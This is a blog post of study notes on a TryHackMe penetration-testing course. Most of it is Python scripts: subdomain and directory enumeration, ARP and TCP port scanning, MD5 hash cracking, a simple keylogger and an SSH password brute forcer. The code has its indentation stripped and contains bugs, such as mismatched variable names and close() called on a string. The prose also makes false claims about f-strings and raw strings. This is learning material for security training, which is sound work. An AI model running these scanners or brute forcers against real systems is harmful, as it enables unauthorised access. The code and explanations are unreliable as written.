---
title: 'TryHackMe: Web Fundamentals (Supplements)'
date: 2022-02-01 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-02-01-tryhackme-web-fundamentals-supplements.html
author: 100007
---

# TryHackMe: Web Fundamentals (Supplements)

**author:** Nathan Acks  
**date:** 2022-02-01

# Inclusion

[See my Inclusion CTF write-up.](https://cardboard-iguana.com/notes/tryhackme-inclusion.html)

# Python for Pentesters

## Introduction

Two Python packages to bundle up a script as a Windows EXE: `pyinstaller` (which is the one everyone uses) and `Py2exe`.

## Subdomain Enumeration

```
#!/usr/bin/env python3

# The script will use a list of potential subdomains and
# prepends them to the domain name provided via a
# command-line argument.
#
# The script then tries to connect to the subdomains and
# assumes the ones that accept the connection exist.

import requests
import sys
sub_list = open("wordlist.txt").read()
subdoms = sub_list.splitlines()
for sub in subdoms:
sub_domain = f"http://{sub}.{sys.argv[1]}"
try:
requests.get(sub_domains)
except requests.ConnectionError:
pass
else:
print("Valid domain: ", sub_domains)
```

Note that the `f` above isn’t a mistake – rather it’s the use of an “f-string”, which allows the expansion of `{sys}` and `{sys.argv[1]}`. This requires Python 3.6+.

- [Quick Answer: How Do You Write An F String In Python](https://whatisanything.com/how-do-you-write-an-f-string-in-python/)

## Directory Enumeration

```
#!/usr/bin/env python3

# A simple directory enumeration tool.
#
# Expects a wordlist.txt in the working directory and
# appends it to a domain name provided via a command-line
# argument.

import requests
import sys
sub_list = open("wordlist.txt").read()
directories = sub_list.splitlines()
for dir in directories:
dir_enum = f"http://{sys.argv[1]}/{dir}/"
r = requests.get(dir_enum)
if r.status_code == 404:
pass
else:
print("Valid directory:", dir_enum)
```

This requires Python 3.6+.

## Network Scanner

```
#!/usr/bin/env python3

# Scans the given IP range on the given network using ARP
# rather than ICMP to help bypass potential alerting.

from scapy.all import *
interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"
packet = Ether(dst = broadcastMac) / ARP(pdst = ip_range)
ans, unans = srp(packet, timeout = 2, iface = interface, inter = 0.1)
for send, receive in ans:
print(receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

As above, the `r` here isn’t a mistake – rather it specifies a “raw string”. This again requires Python 3.6+.

- [Quick Answer: How Do You Write An F String In Python](https://whatisanything.com/how-do-you-write-an-f-string-in-python/)

## Port Scanner

```
#!/usr/bin/env python3

# Look for open ports on the specified IP address.

import sys
import socket
ip = '192.168.1.6'
# Alternately: ip = socket.gethostbyname(sys.argv[1])

ports = range(1, 65535)
# Alternately: ports = {21, 22, 23, 53, 80, 135, 443, 445}

open_ports = []
def probe_port(ip, port, result = 1):
try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.5)
r = sock.connect_ex((ip, port))
if r == 0:
result = r
sock.close()
except Exception as e:
pass
return result
for port in ports:
sys.stdout.flush()
response = probe_port(ip, port)
if response == 0:
open_ports.append(port)
if open_ports:
print ("Open Ports are: ")
print (sorted(open_ports))
else:
print ("Looks like no ports are open :(")
```

The alternate port list above represents common ports that are used on internal corporate networks.

Note that this is making a full TCP handshake, so it’s going to be slooooooow. There’s no output in this script until the end, so if you want to check on progress you’ll need to try something like:

```
netstat | grep $IP
```

## File Downloader

```
#!/usr/bin/env python3

# Download a file with Python.

import requests
url = 'https://assets.tryhackme.com/img/THMlogo.png'
outfile = 'THMlogo.png'
r = requests.get(url, allow_redirects = True)
open(outfile, 'wb').write(r.content)
```

## Hash Cracker

```
#!/usr/bin/env python3

# Given a wordlist, crack a (MD5) hash.

import hashlib
wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))
with open(wordlist_location, 'r') as file:
for line in file.readlines():
hash_ob = hashlib.md5(line.strip().encode())
# See hashlib.algorithms_available() for options
 # besides hashlib.md5().

hashed_pass = hash_ob.hexdigest()
if hashed_pass == hash_input:
print('Found cleartext password: ' + line.strip())
exit(0)
```

## Keyloggers

```
#!/usr/bin/env python3

# Records all keystrokes up until "Enter", then replays
# them. Note that the "keyboard" module does *not* seem
# to be available on most systems out-of-the-box, and
# will need to be installed using pip.

import keyboard
keys = keyboard.record(until = 'ENTER')
keyboard.play(keys)
```

## SSH Brute Forcing

```
#!/usr/bin/env python3

# Attempt to brute force an SSH login given a (cleartext)
# password list.

import paramiko
import sys
import os
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))
# Alternately: Use sys.argv[] to specify some/all of these.

def ssh_connect(password, code = 0):
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
ssh.connect(target, port = 22, username = username, password = password)
except paramiko.AuthenticationException:
code = 1
ssh.close()
return code
with open(password_file, 'r') as file:
for line in file.readlines():
password = line.strip()
try:
response = ssh_connect(password)
if response == 0:
print('password found: ' + password)
exit(0)
elif response == 1:
print('no luck')
except Exception as e:
print(e)
pass
password_file.close()
```

Note that, like the port scanner earlier, this is slooooooow… (At least it provides us with some feedback that it’s actually working though.)

